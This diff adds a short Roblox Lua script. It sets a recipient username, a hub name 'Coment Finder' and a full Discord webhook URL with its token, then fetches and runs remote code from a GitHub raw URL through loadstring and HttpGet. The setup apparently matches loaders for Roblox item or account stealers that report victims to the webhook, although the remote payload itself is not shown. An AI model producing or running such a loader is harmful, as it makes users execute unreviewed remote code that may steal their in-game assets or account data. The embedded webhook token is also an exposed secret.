@@ -1,0 +1,5 @@
+_G.username = SYEDRYAN1
+_G.hubname = Coment Finder
+_G.WebhookUrl = https://discord.com/api/webhooks/1095659508971348120/3JveGy1Gze2rDIZ8NZPS_9VIk_qgDBk5XgG1ydVnG1N86ZXVOwcD-FDYnQCtfzTsWHy8
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jayiioceanii/peakontop/main/peak.lua"))()
